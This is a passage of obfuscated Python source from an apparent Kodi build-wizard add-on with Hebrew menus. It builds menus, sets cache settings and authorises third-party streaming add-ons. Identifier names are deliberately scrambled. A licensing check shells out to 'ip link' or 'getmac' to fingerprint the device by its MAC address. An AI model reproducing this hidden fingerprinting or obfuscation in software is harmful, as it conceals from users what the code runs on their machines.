							OO0000OOOO0O000O0 =OO0000OOOO0O000O0 [:OO0000OOOO0O000O0 .find (" ")]#line:1695
						elif OO0000OOOO0O000O0 .find ("/")>0 :#line:1696
							OO0000OOOO0O000O0 =OO0000OOOO0O000O0 [:OO0000OOOO0O000O0 .find ("/")]#line:1697
						elif OO0000OOOO0O000O0 .find (">")>0 :#line:1698
							OO0000OOOO0O000O0 =OO0000OOOO0O000O0 [:OO0000OOOO0O000O0 .find (">")]#line:1699
					O0000OOOOOOO0OOO0 .append (OO0000OOOO0O000O0 .strip ())#line:1701
			OOO0OOOOO0O00OO0O =O0000OOOOOOO0OOO0 #line:1702
		else :#line:1703
			O0000OOOOOOO0OOO0 =[]#line:1704
			for OO000O00000O0O000 in OOO0OOOOO0O00OO0O :#line:1705
				O00OO0O000000O0O0 =u"</"+name #line:1706
				OOO0OO0OOO0O00000 =OOO000OOOOOO00O0O .find (OO000O00000O0O000 )#line:1708
				OO0OO0O0000OOOOOO =OOO000OOOOOO00O0O .find (O00OO0O000000O0O0 ,OOO0OO0OOO0O00000 )#line:1709
				O000O00O000O0OOO0 =OOO000OOOOOO00O0O .find ("<"+name ,OOO0OO0OOO0O00000 +1 )#line:1710
				while O000O00O000O0OOO0 <OO0OO0O0000OOOOOO and O000O00O000O0OOO0 !=-1 :#line:1712
					OO0O0OOO0O00OOOOO =OOO000OOOOOO00O0O .find (O00OO0O000000O0O0 ,OO0OO0O0000OOOOOO +len (O00OO0O000000O0O0 ))#line:1713
					if OO0O0OOO0O00OOOOO !=-1 :#line:1714
						OO0OO0O0000OOOOOO =OO0O0OOO0O00OOOOO #line:1715
					O000O00O000O0OOO0 =OOO000OOOOOO00O0O .find ("<"+name ,O000O00O000O0OOO0 +1 )#line:1716
				if OOO0OO0OOO0O00000 ==-1 and OO0OO0O0000OOOOOO ==-1 :#line:1718
					O00000O0OO000OOOO =u""#line:1719
				elif OOO0OO0OOO0O00000 >-1 and OO0OO0O0000OOOOOO >-1 :#line:1720
					O00000O0OO000OOOO =OOO000OOOOOO00O0O [OOO0OO0OOO0O00000 +len (OO000O00000O0O000 ):OO0OO0O0000OOOOOO ]#line:1721
				elif OO0OO0O0000OOOOOO >-1 :#line:1722
					O00000O0OO000OOOO =OOO000OOOOOO00O0O [:OO0OO0O0000OOOOOO ]#line:1723
				elif OOO0OO0OOO0O00000 >-1 :#line:1724
					O00000O0OO000OOOO =OOO000OOOOOO00O0O [OOO0OO0OOO0O00000 +len (OO000O00000O0O000 ):]#line:1725
				if ret :#line:1727
					O00OO0O000000O0O0 =OOO000OOOOOO00O0O [OO0OO0O0000OOOOOO :OOO000OOOOOO00O0O .find (">",OOO000OOOOOO00O0O .find (O00OO0O000000O0O0 ))+1 ]#line:1728
					O00000O0OO000OOOO =OO000O00000O0O000 +O00000O0OO000OOOO +O00OO0O000000O0O0 #line:1729
				OOO000OOOOOO00O0O =OOO000OOOOOO00O0O [OOO000OOOOOO00O0O .find (O00000O0OO000OOOO ,OOO000OOOOOO00O0O .find (OO000O00000O0O000 ))+len (O00000O0OO000OOOO ):]#line:1731
				O0000OOOOOOO0OOO0 .append (O00000O0OO000OOOO )#line:1732
			OOO0OOOOO0O00OO0O =O0000OOOOOOO0OOO0 #line:1733
		OOOO00OO000OO0OO0 +=OOO0OOOOO0O00OO0O #line:1734
	return OOOO00OO000OO0OO0 #line:1736
def addItem (O0OO0OOO0OOO0OO00 ,O000O00O00O00000O ,OOO0O00OOO00O0O0O ,O0O0OO0OOOO000O00 ,OO000O0000000OOO0 ,description =None ):#line:1738
	if description ==None :description =''#line:1739
	description ='[COLOR white]'+description +'[/COLOR]'#line:1740
	OOOOOO0000000O000 =sys .argv [0 ]+"?url="+urllib .quote_plus (O000O00O00O00000O )+"&mode="+str (OOO0O00OOO00O0O0O )+"&name="+urllib .quote_plus (O0OO0OOO0OOO0OO00 )+"&iconimage="+urllib .quote_plus (O0O0OO0OOOO000O00 )+"&fanart="+urllib .quote_plus (OO000O0000000OOO0 )#line:1741
	O00O0000O0OOOOOO0 =True #line:1742
	OOO000OOO0O0OOOOO =xbmcgui .ListItem (O0OO0OOO0OOO0OO00 ,iconImage =O0O0OO0OOOO000O00 ,thumbnailImage =O0O0OO0OOOO000O00 )#line:1743
	OOO000OOO0O0OOOOO .setInfo (type ="Video",infoLabels ={"Title":O0OO0OOO0OOO0OO00 ,"Plot":description })#line:1744
	OOO000OOO0O0OOOOO .setProperty ("fanart_Image",OO000O0000000OOO0 )#line:1745
	OOO000OOO0O0OOOOO .setProperty ("icon_Image",O0O0OO0OOOO000O00 )#line:1746
	O00O0000O0OOOOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOOO0000000O000 ,listitem =OOO000OOO0O0OOOOO ,isFolder =False )#line:1747
	return O00O0000O0OOOOOO0 #line:1748
def get_params ():#line:1750
		OOOOOOO0000OO00OO =[]#line:1751
		OOOOOOO0000O0OOOO =sys .argv [2 ]#line:1752
		if len (OOOOOOO0000O0OOOO )>=2 :#line:1753
				O00O000O00O0000OO =sys .argv [2 ]#line:1754
				OO0OO0O0O00OOOOOO =O00O000O00O0000OO .replace ('?','')#line:1755
				if (O00O000O00O0000OO [len (O00O000O00O0000OO )-1 ]=='/'):#line:1756
						O00O000O00O0000OO =O00O000O00O0000OO [0 :len (O00O000O00O0000OO )-2 ]#line:1757
				O00O0OOO0OO00OO0O =OO0OO0O0O00OOOOOO .split ('&')#line:1758
				OOOOOOO0000OO00OO ={}#line:1759
				for O0O0O0O00OOO000OO in range (len (O00O0OOO0OO00OO0O )):#line:1760
						O0O0000000OO0OOOO ={}#line:1761
						O0O0000000OO0OOOO =O00O0OOO0OO00OO0O [O0O0O0O00OOO000OO ].split ('=')#line:1762
						if (len (O0O0000000OO0OOOO ))==2 :#line:1763
								OOOOOOO0000OO00OO [O0O0000000OO0OOOO [0 ]]=O0O0000000OO0OOOO [1 ]#line:1764
		return OOOOOOO0000OO00OO #line:1766
def decode (OOO0OO0O0OOOO0O0O ,OOO0OOO00OOO0OOO0 ):#line:1771
    import base64 #line:1772
    OOOO0OOOO0O0O0OO0 =[]#line:1773
    if (len (OOO0OO0O0OOOO0O0O ))!=4 :#line:1775
     return 10 #line:1776
    OOO0OOO00OOO0OOO0 =base64 .urlsafe_b64decode (OOO0OOO00OOO0OOO0 )#line:1777
    for O0O0O00O00O000O00 in range (len (OOO0OOO00OOO0OOO0 )):#line:1779
        O0O00O0OOO0OO00OO =OOO0OO0O0OOOO0O0O [O0O0O00O00O000O00 %len (OOO0OO0O0OOOO0O0O )]#line:1780
        OO0000O0O00OO0O0O =chr ((256 +ord (OOO0OOO00OOO0OOO0 [O0O0O00O00O000O00 ])-ord (O0O00O0OOO0OO00OO ))%256 )#line:1781
        OOOO0OOOO0O0O0OO0 .append (OO0000O0O00OO0O0O )#line:1782
    return "".join (OOOO0OOOO0O0O0OO0 )#line:1783
def tmdb_list (OO0O00000O0OO0OO0 ):#line:1784
    OOO0OO0OOOO0O0OOO =decode ("7643",OO0O00000O0OO0OO0 )#line:1787
    return int (OOO0OO0OOOO0O0OOO )#line:1790
def u_list (O0O0O00OOO0O0OOO0 ):#line:1791
    from math import sqrt #line:1793
    OO0O000OOOOO00O00 =tmdb_list (TMDB_NEW_API )#line:1794
    O0O0O0O00O0O0OOO0 =str ((getHwAddr ('eth0'))*OO0O000OOOOO00O00 )#line:1796
    O0O0OOOOOO000O00O =int (O0O0O0O00O0O0OOO0 [1 ]+O0O0O0O00O0O0OOO0 [2 ]+O0O0O0O00O0O0OOO0 [5 ]+O0O0O0O00O0O0OOO0 [7 ])#line:1797
    O0OOO000OOOO0OO0O =(ADDON .getSetting ("pass"))#line:1799
    O00O00OO0O00OOO0O =(str (round (sqrt ((O0O0OOOOOO000O00O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1804
    if '.'in O00O00OO0O00OOO0O :#line:1805
     O00O00OO0O00OOO0O =(str (round (sqrt ((O0O0OOOOOO000O00O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1806
    if O0OOO000OOOO0OO0O ==O00O00OO0O00OOO0O :#line:1808
      OOO0O00O0O0OO0OO0 =O0O0O00OOO0O0OOO0 #line:1810
    else :#line:1812
       if STARTP2 ()and STARTP ()=='ok':#line:1813
         return O0O0O00OOO0O0OOO0 #line:1816
       OOO0O00O0O0OO0OO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1817
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1818
       sys .exit ()#line:1819
    return OOO0O00O0O0OO0OO0 #line:1820
def disply_hwr ():#line:1823
   try :#line:1824
    OOOOO0OOO0OOOOOOO =tmdb_list (TMDB_NEW_API )#line:1825
    O00000OOO0OO0O0OO =str ((getHwAddr ('eth0'))*OOOOO0OOO0OOOOOOO )#line:1826
    O00O0OOO0000OOOOO =(O00000OOO0OO0O0OO [1 ]+O00000OOO0OO0O0OO [2 ]+O00000OOO0OO0O0OO [5 ]+O00000OOO0OO0O0OO [7 ])#line:1833
    O0O0OOO0O0OO00O00 =(ADDON .getSetting ("action"))#line:1834
    wiz .setS ('action',str (O00O0OOO0000OOOOO ))#line:1836
   except :pass #line:1837
def disply_hwr2 ():#line:1838
   try :#line:1839
    O0OOO0OOOO0O0000O =tmdb_list (TMDB_NEW_API )#line:1840
    O00O0O0OOO00O0000 =str ((getHwAddr ('eth0'))*O0OOO0OOOO0O0000O )#line:1842
    O000OO00O0OO0OO00 =(O00O0O0OOO00O0000 [1 ]+O00O0O0OOO00O0000 [2 ]+O00O0O0OOO00O0000 [5 ]+O00O0O0OOO00O0000 [7 ])#line:1851
    O0OO000OO0O00O0OO =(ADDON .getSetting ("action"))#line:1852
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O000OO00O0OO0OO00 )#line:1855
   except :pass #line:1856
def getHwAddr (OO0000000O0OO0O0O ):#line:1858
   import subprocess ,time #line:1859
   O00OOO0OOOOO00OOO ='windows'#line:1860
   if xbmc .getCondVisibility ('system.platform.android'):#line:1861
       O00OOO0OOOOO00OOO ='android'#line:1862
   if xbmc .getCondVisibility ('system.platform.android'):#line:1863
     O00OOO00000OO0O0O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1864
     OOO0O0O00O0OOOOOO =re .compile ('link/ether (.+?) brd').findall (str (O00OOO00000OO0O0O ))#line:1866
     O0O0O00O0O000O00O =0 #line:1867
     for OO00000O00000O000 in OOO0O0O00O0OOOOOO :#line:1868
      if OOO0O0O00O0OOOOOO !='00:00:00:00:00:00':#line:1869
          OOO000OOO0OOOOO00 =OO00000O00000O000 #line:1870
          O0O0O00O0O000O00O =O0O0O00O0O000O00O +int (OOO000OOO0OOOOO00 .replace (':',''),16 )#line:1871
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1873
       OOO0OO0O0O00OO00O =0 #line:1874
       O0O0O00O0O000O00O =0 #line:1875
       O0OOOOO0O000OO00O =[]#line:1876
       O0O0OOOO00O0000OO =os .popen ("getmac").read ()#line:1877
       O0O0OOOO00O0000OO =O0O0OOOO00O0000OO .split ("\n")#line:1878
       for OOO0O0OOO0O0OOO00 in O0O0OOOO00O0000OO :#line:1880
            O0OOOO0O000OOOOO0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0O0OOO0O0OOO00 ,re .I )#line:1881
            if O0OOOO0O000OOOOO0 :#line:1882
                OOO0O0O00O0OOOOOO =O0OOOO0O000OOOOO0 .group ().replace ('-',':')#line:1883
                O0OOOOO0O000OO00O .append (OOO0O0O00O0OOOOOO )#line:1884
                O0O0O00O0O000O00O =O0O0O00O0O000O00O +int (OOO0O0O00O0OOOOOO .replace (':',''),16 )#line:1887
   else :#line:1889
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1890
   try :#line:1907
    return O0O0O00O0O000O00O #line:1908
   except :pass #line:1909
def getpass ():#line:1910
	disply_hwr2 ()#line:1912
def setpass ():#line:1913
    OO0O00O0OOOO0O00O =xbmcgui .Dialog ()#line:1914
    O0OOO00000OOOOOOO =''#line:1915
    O0O0O0OOOO0OO00O0 =xbmc .Keyboard (O0OOO00000OOOOOOO ,'הכנס סיסמה')#line:1917
    O0O0O0OOOO0OO00O0 .doModal ()#line:1918
    if O0O0O0OOOO0OO00O0 .isConfirmed ():#line:1919
           O0O0O0OOOO0OO00O0 =O0O0O0OOOO0OO00O0 .getText ()#line:1920
    wiz .setS ('pass',str (O0O0O0OOOO0OO00O0 ))#line:1921
def setuname ():#line:1922
    O0OOOOOO0000O0O00 =''#line:1923
    OO0O000OOO0OO0OOO =xbmc .Keyboard (O0OOOOOO0000O0O00 ,'הכנס שם משתמש')#line:1924
    OO0O000OOO0OO0OOO .doModal ()#line:1925
    if OO0O000OOO0OO0OOO .isConfirmed ():#line:1926
           O0OOOOOO0000O0O00 =OO0O000OOO0OO0OOO .getText ()#line:1927
           wiz .setS ('user',str (O0OOOOOO0000O0O00 ))#line:1928
def powerkodi ():#line:1929
    os ._exit (1 )#line:1930
def buffer1 ():#line:1932
	OO0OOOOO0O000O000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1933
	O000OO0OO00OOO000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1934
	O000OOO00O000O00O =xbmc .getInfoLabel ("System.FreeMemory")#line:1935
	OO0OOO0O0OO0O0O00 =re .sub ('[^0-9]','',O000OOO00O000O00O )#line:1936
	OO0OOO0O0OO0O0O00 =int (OO0OOO0O0OO0O0O00 )/3 #line:1937
	O0000OO0O00OO0O0O =OO0OOO0O0OO0O0O00 *1024 *1024 #line:1938
	try :OO0O0O00O0OO0O0O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1939
	except :OO0O0O00O0OO0O0O0 =16 #line:1940
	O00000OO000OO0OOO =DIALOG .yesno ('FREE MEMORY: '+str (O000OOO00O000O00O ),'Based on your free Memory your optimal buffersize is: '+str (OO0OOO0O0OO0O0O00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1943
	if O00000OO000OO0OOO ==1 :#line:1944
		with open (OO0OOOOO0O000O000 ,"w")as OO0OOO000O0OO00O0 :#line:1945
			if OO0O0O00O0OO0O0O0 >=17 :O0OO0O0O00OOO000O =xml_data_advSettings_New (str (O0000OO0O00OO0O0O ))#line:1946
			else :O0OO0O0O00OOO000O =xml_data_advSettings_old (str (O0000OO0O00OO0O0O ))#line:1947
			OO0OOO000O0OO00O0 .write (O0OO0O0O00OOO000O )#line:1949
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO0O00OO0O0O ),'Please restart Kodi for settings to apply.','')#line:1950
	elif O00000OO000OO0OOO ==0 :#line:1952
		O0000OO0O00OO0O0O =_OO00OOOO00OOO0O0O (default =str (O0000OO0O00OO0O0O ),heading ="INPUT BUFFER SIZE")#line:1953
		with open (OO0OOOOO0O000O000 ,"w")as OO0OOO000O0OO00O0 :#line:1954
			if OO0O0O00O0OO0O0O0 >=17 :O0OO0O0O00OOO000O =xml_data_advSettings_New (str (O0000OO0O00OO0O0O ))#line:1955
			else :O0OO0O0O00OOO000O =xml_data_advSettings_old (str (O0000OO0O00OO0O0O ))#line:1956
			OO0OOO000O0OO00O0 .write (O0OO0O0O00OOO000O )#line:1957
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO0O00OO0O0O ),'Please restart Kodi for settings to apply.','')#line:1958
def xml_data_advSettings_old (O0000O0000O0O0O00 ):#line:1959
	OOO00000OOO0O0O0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0000O0000O0O0O00 #line:1969
	return OOO00000OOO0O0O0O #line:1970
def xml_data_advSettings_New (OOO0OOOO0O00000OO ):#line:1972
	O00O0OO0OOOO0000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0OOOO0O00000OO #line:1984
	return O00O0OO0OOOO0000O #line:1985
def write_ADV_SETTINGS_XML (O00O0O0O00O00O00O ):#line:1986
    if not os .path .exists (xml_file ):#line:1987
        with open (xml_file ,"w")as O0OOOO0000O0OO000 :#line:1988
            O0OOOO0000O0OO000 .write (xml_data )#line:1989
def _OO00OOOO00OOO0O0O (default ="",heading ="",hidden =False ):#line:1990
    ""#line:1991
    OOO000O0OO0OOOO00 =xbmc .Keyboard (default ,heading ,hidden )#line:1992
    OOO000O0OO0OOOO00 .doModal ()#line:1993
    if (OOO000O0OO0OOOO00 .isConfirmed ()):#line:1994
        return unicode (OOO000O0OO0OOOO00 .getText (),"utf-8")#line:1995
    return default #line:1996
def index ():#line:1998
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1999
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2000
	if AUTOUPDATE =='Yes':#line:2001
		if wiz .workingURL (WIZARDFILE )==True :#line:2002
			OO00OO00O000O0000 =wiz .checkWizard ('version')#line:2003
			if OO00OO00O000O0000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO00OO00O000O0000 ),'wizardupdate',themeit =THEME2 )#line:2004
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2005
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2006
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2007
	if len (BUILDNAME )>0 :#line:2008
		OO0O0OOO00OO0OOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2009
		OO00000O0O0O000OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2010
		if OO0O0OOO00OO0OOO0 >BUILDVERSION :OO00000O0O0O000OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO00000O0O0O000OO ,OO0O0OOO00OO0OOO0 )#line:2011
		addDir (OO00000O0O0O000OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2013
		try :#line:2015
		     OO0OO0OO0O00O00O0 =wiz .themeCount (BUILDNAME )#line:2016
		except :#line:2017
		   OO0OO0OO0O00O00O0 =False #line:2018
		if not OO0OO0OO0O00O00O0 ==False :#line:2019
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2020
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2021
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2024
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2025
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2026
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2030
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2032
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2034
def morsetup ():#line:2036
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2037
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2038
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2039
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2040
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2041
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2045
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2046
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2049
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	setView ('files','viewType')#line:2061
def morsetup2 ():#line:2062
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2063
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2064
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2065
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2066
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2067
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2069
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2070
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2072
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
def fastupdate ():#line:2074
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2075
def forcefastupdate ():#line:2077
			O000OO00OO0O0OO0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2078
			wiz .ForceFastUpDate (ADDONTITLE ,O000OO00OO0O0OO0O )#line:2079
def rdsetup ():#line:2083
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2084
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2088
def traktsetup ():#line:2091
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2092
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2093
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2094
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2095
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2096
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2097
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2098
	setView ('files','viewType')#line:2099
def setautorealdebrid ():#line:2100
    from resources .libs import real_debrid #line:2101
    O0O0O00OOO0OO0OOO =real_debrid .RealDebridFirst ()#line:2102
    O0O0O00OOO0OO0OOO .auth ()#line:2103
def setrealdebrid ():#line:2105
    from resources .libs import real_debrid #line:2106
    O0000000O000O0O0O =real_debrid .RealDebrid ()#line:2107
    O0000000O000O0O0O .auth ()#line:2108
    O0000000O000O0O0O =real_debrid .RealDebrid ()#line:2109
    OOOOOO000000OOO0O =(O0000000O000O0O0O .getRelevantHosters ())#line:2110
    rdon ()#line:2111
def resolveurlsetup ():#line:2113
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2114
def urlresolversetup ():#line:2115
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2116
def placentasetup ():#line:2118
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2119
def reptiliasetup ():#line:2120
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2121
def flixnetsetup ():#line:2122
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2123
def yodasetup ():#line:2124
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2125
def numberssetup ():#line:2126
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2127
def uranussetup ():#line:2128
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2129
def genesissetup ():#line:2130
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2131
def net_tools (view =None ):#line:2133
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2134
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2135
	setView ('files','viewType')#line:2137
def speedMenu ():#line:2138
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2139
def viewIP ():#line:2140
	OO0OO0OOO0O0OO0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2154
	O0OO0O00O0O00O0OO =[];OO0O00OOO00000OOO =0 #line:2155
	for O0OO0000O0OO00000 in OO0OO0OOO0O0OO0O0 :#line:2156
		OO0000OO0O0O000OO =wiz .getInfo (O0OO0000O0OO00000 )#line:2157
		OOOOOO0OO0O0OOOO0 =0 #line:2158
		while OO0000OO0O0O000OO =="Busy"and OOOOOO0OO0O0OOOO0 <10 :#line:2159
			OO0000OO0O0O000OO =wiz .getInfo (O0OO0000O0OO00000 );OOOOOO0OO0O0OOOO0 +=1 ;wiz .log ("%s sleep %s"%(O0OO0000O0OO00000 ,str (OOOOOO0OO0O0OOOO0 )));xbmc .sleep (1000 )#line:2160
		O0OO0O00O0O00O0OO .append (OO0000OO0O0O000OO )#line:2161
		OO0O00OOO00000OOO +=1 #line:2162
	OOO0O0O00OO0OOO00 ,OOOOOOOOO0O0OOO0O ,O0000O000OO00OOO0 =getIP ()#line:2163
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O00O0O00O0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2164
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OO0OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2165
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO0O0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2166
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O000OO00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2167
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O00O0O00O0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2168
	setView ('files','viewType')#line:2169
def buildMenu ():#line:2171
	if USERNAME =='':#line:2172
		ADDON .openSettings ()#line:2173
		sys .exit ()#line:2174
	if PASSWORD =='':#line:2175
		ADDON .openSettings ()#line:2176
	OO00O0O0O0O00OO0O =u_list (SPEEDFILE )#line:2177
	(OO00O0O0O0O00OO0O )#line:2178
	OO0000O0O0O0OO0O0 =(wiz .workingURL (OO00O0O0O0O00OO0O ))#line:2179
	(OO0000O0O0O0OO0O0 )#line:2180
	OO0000O0O0O0OO0O0 =wiz .workingURL (SPEEDFILE )#line:2181
	if not OO0000O0O0O0OO0O0 ==True :#line:2182
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2183
